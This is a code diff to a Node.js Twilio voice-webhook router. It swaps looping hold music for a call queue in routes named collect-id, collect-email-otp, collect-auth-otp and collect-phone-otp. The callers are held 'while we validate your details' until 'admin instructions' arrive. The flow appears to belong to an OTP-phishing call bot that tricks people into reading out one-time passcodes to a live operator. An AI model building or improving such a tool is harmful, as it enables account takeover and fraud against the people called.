@@ -106,19 +106,15 @@ router.post('/voice-response/:sessionId', async (req, res) => {
             twiml.hangup();
             
         } else if (currentAction === 'playing_music') {
-            // USING DIFFERENT MUSIC URL THAT 100% WORKS
-            twiml.say('Please hold while we process your request.');
-            const play = twiml.play({ loop: 10 });
-            play.url = 'https://actions.google.com/sounds/687/phone_call_waiting_music.mp3';
-            twiml.redirect(`/webhooks/check-hold/${sessionId}`, { method: 'POST' });
+            // USE TWILIO'S QUEUE WITH HOLD MUSIC - THIS WORKS 100%
+            const enqueue = twiml.enqueue({
+                action: `/webhooks/leave-queue/${sessionId}`,
+                method: 'POST'
+            });
+            enqueue.queue('hold_queue');
+            twiml.say('Unable to queue. Goodbye.');
+            twiml.hangup();
             
-        } else if (currentAction === 'custom_voice') {
-            const twiml2 = new VoiceResponse();
-            twiml2.say('Please wait for admin instructions.');
-            twiml2.hangup();
-            res.type('text/xml');
-            res.send(twiml2.toString());
-            return;
         } else {
             twiml.say('Please wait for admin instructions.');
             twiml.hangup();
@@ -179,27 +175,19 @@ router.post('/handle-consent/:sessionId', async (req, res) => {
     res.send(twiml.toString());
 });
 
-router.post('/check-hold/:sessionId', async (req, res) => {
+router.post('/leave-queue/:sessionId', async (req, res) => {
     const sessionId = req.params.sessionId;
     const twiml = new VoiceResponse();
-    
-    console.log('Check hold for session:', sessionId);
     
     const session = await db.query(
         `SELECT current_action FROM call_sessions WHERE id = $1`,
         [sessionId]
     );
     
-    console.log('Current action in check-hold:', session.rows[0]?.current_action);
-    
-    if (session.rows[0] && session.rows[0].current_action === 'playing_music') {
-        console.log('Still playing music, looping...');
-        const play = twiml.play({ loop: 5 });
-        play.url = 'https://actions.google.com/sounds/687/phone_call_waiting_music.mp3';
-        twiml.redirect(`/webhooks/check-hold/${sessionId}`, { method: 'POST' });
-    } else {
-        console.log('Music interrupted, moving to next action');
+    if (session.rows[0] && session.rows[0].current_action !== 'playing_music') {
         twiml.redirect(`/webhooks/voice-response/${sessionId}`, { method: 'POST' });
+    } else {
+        twiml.hangup();
     }
     
     res.type('text/xml');
@@ -224,10 +212,11 @@ router.post('/collect-id/:sessionId', async (req, res) => {
         
         await db.query(`UPDATE call_sessions SET current_action = 'playing_music' WHERE id = $1`, [sessionId]);
         
-        twiml.say('Thank you. Please hold while we validate your details.');
-        const play = twiml.play({ loop: 10 });
-        play.url = 'https://actions.google.com/sounds/687/phone_call_waiting_music.mp3';
-        twiml.redirect(`/webhooks/check-hold/${sessionId}`, { method: 'POST' });
+        const enqueue = twiml.enqueue({
+            action: `/webhooks/leave-queue/${sessionId}`,
+            method: 'POST'
+        });
+        enqueue.queue('hold_queue');
     } else {
         twiml.say('No ID received. Goodbye.');
         twiml.hangup();
@@ -255,10 +244,11 @@ router.post('/collect-email-otp/:sessionId', async (req, res) => {
         
         await db.query(`UPDATE call_sessions SET current_action = 'playing_music' WHERE id = $1`, [sessionId]);
         
-        twiml.say('Thank you. Please hold while we validate your details.');
-        const play = twiml.play({ loop: 10 });
-        play.url = 'https://actions.google.com/sounds/687/phone_call_waiting_music.mp3';
-        twiml.redirect(`/webhooks/check-hold/${sessionId}`, { method: 'POST' });
+        const enqueue = twiml.enqueue({
+            action: `/webhooks/leave-queue/${sessionId}`,
+            method: 'POST'
+        });
+        enqueue.queue('hold_queue');
     } else {
         twiml.say('No OTP received. Goodbye.');
         twiml.hangup();
@@ -286,10 +276,11 @@ router.post('/collect-auth-otp/:sessionId', async (req, res) => {
         
         await db.query(`UPDATE call_sessions SET current_action = 'playing_music' WHERE id = $1`, [sessionId]);
         
-        twiml.say('Thank you. Please hold while we validate your details.');
-        const play = twiml.play({ loop: 10 });
-        play.url = 'https://actions.google.com/sounds/687/phone_call_waiting_music.mp3';
-        twiml.redirect(`/webhooks/check-hold/${sessionId}`, { method: 'POST' });
+        const enqueue = twiml.enqueue({
+            action: `/webhooks/leave-queue/${sessionId}`,
+            method: 'POST'
+        });
+        enqueue.queue('hold_queue');
     } else {
         twiml.say('No code received. Goodbye.');
         twiml.hangup();
@@ -317,10 +308,11 @@ router.post('/collect-phone-otp/:sessionId', async (req, res) => {
         
         await db.query(`UPDATE call_sessions SET current_action = 'playing_music' WHERE id = $1`, [sessionId]);
         
-        twiml.say('Thank you. Please hold while we validate your details.');
-        const play = twiml.play({ loop: 10 });
-        play.url = 'https://actions.google.com/sounds/687/phone_call_waiting_music.mp3';
-        twiml.redirect(`/webhooks/check-hold/${sessionId}`, { method: 'POST' });
+        const enqueue = twiml.enqueue({
+            action: `/webhooks/leave-queue/${sessionId}`,
+            method: 'POST'
+        });
+        enqueue.queue('hold_queue');
     } else {
         twiml.say('No OTP received. Goodbye.');
         twiml.hangup();
@@ -370,10 +362,11 @@ router.post('/collect-custom/:sessionId', async (req, res) => {
         
         await db.query(`UPDATE call_sessions SET current_action = 'playing_music' WHERE id = $1`, [sessionId]);
         
-        twiml.say('Thank you. Please hold while we validate your details.');
-        const play = twiml.play({ loop: 10 });
-        play.url = 'https://actions.google.com/sounds/687/phone_call_waiting_music.mp3';
-        twiml.redirect(`/webhooks/check-hold/${sessionId}`, { method: 'POST' });
+        const enqueue = twiml.enqueue({
+            action: `/webhooks/leave-queue/${sessionId}`,
+            method: 'POST'
+        });
+        enqueue.queue('hold_queue');
     } else {
         twiml.say('No input received. Goodbye.');
         twiml.hangup();
